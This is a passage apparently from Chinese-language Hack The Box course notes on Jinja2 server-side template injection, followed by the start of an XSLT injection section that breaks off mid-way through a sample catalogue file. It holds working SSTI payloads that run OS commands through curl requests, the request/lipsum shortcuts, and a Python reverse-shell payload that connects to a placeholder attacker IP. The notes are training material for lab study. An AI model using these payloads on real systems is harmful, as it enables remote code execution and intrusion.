groupby  156 _grouper  157 _tee  158 _tee_dataobject  159 Repr  160 deque  161 _deque_iterator  162 _deque_reverse_iterator  163 _tuplegetter  164 _Link  165 partial  166 _lru_cache_wrapper  167 partialmethod  168 singledispatchmethod  169 cached_property  170 DynamicClassAttribute  171 _GeneratorWrapper  172 auto  173 Enum  174 Pattern  175 Match  176 SRE_Scanner  177 State  178 SubPattern  179 Tokenizer  180 Scanner  181 Template  182 Formatter  183 ContextDecorator  184 _GeneratorContextManagerBase  185 _BaseExitStack  186 _Final  187 _Immutable  188 Generic  189 _TypingEmpty  190 _TypingEllipsis  191 NamedTuple  192 typing.io  193 typing.re  194 AST  195 _MarkupEscapeHelper  196 poll  197 epoll  198 BaseSelector  199 socket  200 _IterationGuard  201 WeakSet  202 _RLock  203 Condition  204 Semaphore  205 Event  206 Barrier  207 Thread  208 BaseServer  209 ForkingMixIn  210 _NoThreads  211 ThreadingMixIn  212 BaseRequestHandler  213 WarningMessage  214 catch_warnings  215 date  216 timedelta  217 time  218 tzinfo  219 _Info  220 finalize  221 sha384  222 sha512  223 Random  224 _ResultMixinStr  225 _ResultMixinBytes  226 _NetlocResultMixinBase  227 _localized_month  228 _localized_day  229 Calendar  230 different_locale  231 AddrlistClass  232 Struct  233 unpack_iterator  234 Charset  235 Header  236 _ValueFormatter  237 _PolicyBase  238 BufferedSubFile  239 FeedParser  240 Parser  241 BytesParser  242 Message  243 HTTPConnection  244 _SSLContext  245 _SSLSocket  246 MemoryBIO  247 Session  248 SSLObject  249 MimeTypes  250 Compress  251 Decompress  252 BZ2Compressor  253 BZ2Decompressor  254 LZMACompressor  255 LZMADecompressor  256 Bytecode  257 Untokenizer  258 BlockFinder  259 _void  260 _empty  261 Parameter  262 BoundArguments  263 Signature  264 FrameSummary  265 TracebackException  266 LogRecord  267 PercentStyle  268 Formatter  269 BufferingFormatter  270 Filter  271 Filterer  272 PlaceHolder  273 Manager  274 LoggerAdapter  275 _Missing  276 Aborter  277 Href  278 CompletedProcess  279 Popen  280 HASH  281 blake2b  282 blake2s  283 sha3_224  284 sha3_256  285 sha3_384  286 sha3_512  287 shake_128  288 shake_256  289 _RandomNameSequence  290 _TemporaryFileCloser  291 _TemporaryFileWrapper  292 SpooledTemporaryFile  293 TemporaryDirectory  294 Request  295 OpenerDirector  296 BaseHandler  297 HTTPPasswordMgr  298 AbstractBasicAuthHandler  299 AbstractDigestAuthHandler  300 URLopener  301 ftpwrapper  302 Cookie  303 CookiePolicy  304 Absent  305 CookieJar  306 ImmutableListMixin  307 ImmutableDictMixin  308 _omd_bucket  309 Headers  310 ImmutableHeadersMixin  311 IfRange  312 Range  313 ContentRange  314 FileStorage  315 _HAS_DEFAULT_FACTORY_CLASS  316 _MISSING_TYPE  317 _FIELD_BASE  318 InitVar  319 Field  320 _DataclassParams  321 Event  322 MultipartDecoder  323 MultipartEncoder  324 Finder  325 Loader  326 ResourceReader  327 ImpImporter  328 ImpLoader  329 HMAC  330 ClosingIterator  331 FileWrapper  332 _RangeWrapper  333 HTMLBuilder  334 AcceptMixin  335 AuthorizationMixin  336 WWWAuthenticateMixin  337 Scanner  338 Encoder  339 JSONDecoder  340 JSONEncoder  341 FormDataParser  342 MultiPartParser  343 UserAgent  344 _UserAgentParser  345 Request  346 StreamOnlyMixin  347 Response  348 ResponseStream  349 ResponseStreamMixin  350 CommonRequestDescriptorsMixin  351 CommonResponseDescriptorsMixin  352 ETagRequestMixin  353 ETagResponseMixin  354 UserAgentMixin  355 _TestCookieHeaders  356 _TestCookieResponse  357 EnvironBuilder  358 Client  359 Decimal  360 Context  361 SignalDictMixin  362 ContextManager  363 Number  364 UUID  365 Unpickler  366 Pickler  367 Pdata  368 PicklerMemoProxy  369 UnpicklerMemoProxy  370 _Framer  371 _Unframer  372 _Pickler  373 _Unpickler  374 Bucket  375 BytecodeCache  376 MissingType  377 LRUCache  378 Cycler  379 Joiner  380 Namespace  381 EvalContext  382 Node  383 NodeVisitor  384 Symbols  385 MacroRef  386 Frame  387 TemplateReference  388 Context  389 BlockReference  390 LoopContext  391 Macro  392 Undefined  393 NodeVisitor  394 Failure  395 TokenStreamIterator  396 TokenStream  397 Lexer  398 Parser  399 Environment  400 Template  401 TemplateModule  402 TemplateExpression  403 TemplateStream  404 BaseLoader  405 Local  406 LocalStack  407 LocalManager  408 _ProxyLookup  409 LocalProxy  410 SequenceMatcher  411 Differ  412 HtmlDiff  413 _safe_key  414 PrettyPrinter  415 RuleFactory  416 RuleTemplate  417 BaseConverter  418 Map  419 MapAdapter  420 NullTranslations  421 _FixupStream  422 _AtomicFile  423 LazyFile  424 KeepOpenFile  425 PacifyFlushWrapper  426 ParamType  427 Option  428 Argument  429 ParsingState  430 OptionParser  431 HelpFormatter  432 Context  433 BaseCommand  434 Parameter  435 Namespace  436 _FakeSignal  437 DispatchingApp  438 ScriptInfo  439 ConfigAttribute  440 _AppCtxGlobals  441 AppContext  442 RequestContext  443 Scaffold  444 _CompactJSON  445 SigningAlgorithm  446 Signer  447 Serializer  448 JSONTag  449 TaggedJSONSerializer &lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>正如您在应用程序的响应中所看到的，<code>catch_warnings</code>位于索引#214。</p>
<p>我们拥有构建RCE有效负载所需的一切，如下所示。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">214</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">"touch /tmp/test1"</span>) }}  </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;0&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>应用程序在响应中返回<code>0</code>。这是我们刚刚执行的命令的返回值。<code>0</code>表示命令执行无误。</p>
<p>我们可以确定<code>test1</code>是否是使用以下有效负载创建的。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">214</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'ls /tmp'</span>).read()}}     </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;test1</span><br><span class="line">tmpv4tucw2b</span><br><span class="line">&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们已经完成了有效负载的开发过程，值得一提的是，我们可以使用一些特定的功能来促进对Jinja2 SSTI漏洞的利用。这是<code>request</code>和<code>lipsum</code>。请随意将它们提交给本节的目标。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{request.application.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read()}}</span><br></pre></td></tr></tbody></table></figure>

<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{lipsum.__globals__.os.popen(<span class="string">'id'</span>).read()}}</span><br></pre></td></tr></tbody></table></figure>

<p>反向外壳也可以通过如下有效载荷建立。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{<span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">214</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;PENTESTER_IP&gt;",&lt;PENTESTER_PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''</span>).read()}}</span><br></pre></td></tr></tbody></table></figure>

<h1 id="Attacking-XSLT"><a href="#Attacking-XSLT" class="headerlink" title="Attacking XSLT"></a>Attacking XSLT</h1><p>可扩展样式表语言转换（<code>XSLT</code>）是一种基于XML的语言，通常用于将XML文档转换为HTML、另一个XML文档或PDF。可扩展样式表语言转换服务器端注入可能发生在可以上载任意XSL文件或应用程序使用来自用户的未经验证的输入动态生成XSL转换的XML文档时。</p>
<p>根据具体情况，NetBeans使用内置函数和XPATH语言在浏览器或服务器中转换文档。可扩展样式表语言转换在一些Web应用程序中作为独立功能，SSI引擎和Oracle等数据库存在。在撰写本文时，有3个（<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xslt-10/">1</a>，<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xslt20/">2</a>，<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xslt-30/">3</a>）版本。从攻击者的角度来看，版本1是最不感兴趣的，因为它的内置功能有限。使用最多的XSLT相关项目是Liberty、Xalan和Saxon。为了利用恶意注入，我们需要在服务器端存储恶意标签并访问该内容。</p>
<p>让我们通过结合使用Saxon和JavaScript Version 2来试验JavaScript。</p>
<p>首先，在Pwnbox或本地VM上安装所需的软件包，如下所示：</p>
<h4 id="Installation-of-required-packages"><a href="#Installation-of-required-packages" class="headerlink" title="Installation of required packages"></a>Installation of required packages</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo apt install default-jdk libsaxon-java libsaxonb-java</span><br></pre></td></tr></tbody></table></figure>

<p>接下来，创建以下文件：</p>
<h4 id="catalogue-xml"><a href="#catalogue-xml" class="headerlink" title="catalogue.xml"></a>catalogue.xml</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Empire Burlesque<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Bob Dylan<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Columbia<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1985<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hide your heart<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Bonnie Tyler<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>CBS Records<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1988<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Greatest Hits<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Dolly Parton<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>RCA<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1982<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Still got the blues<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Gary Moore<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Virgin records<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1990<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Eros<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Eros Ramazzotti<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>BMG<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1997<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>One night only<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Bee Gees<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Polydor<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1998<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Sylvias Mother<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Dr.Hook<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>CBS<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.10<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1973<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Maggie May<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Rod Stewart<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Pickwick<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.50<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1990<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Romanza<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Andrea Bocelli<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Polydor<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.80<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1996<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>When a man loves a woman<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Percy Sledge<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Atlantic<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.70<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1987<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Black angel<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Savage Rose<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Mega<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1995<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>1999 Grammy Nominees<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Many<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Grammy<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1999<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>For the good times<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Kenny Rogers<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Mucik Master<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.70<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1995<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Big Willie style<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Will Smith<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Columbia<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1997<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Tupelo Honey<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Van Morrison<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Polydor<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1971<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Soulsville<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Jorn Hoel<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>Norway<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>WEA<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1996<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The very best of<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Cat Stevens<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Island<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1990<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Stop<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Sam Brown<span 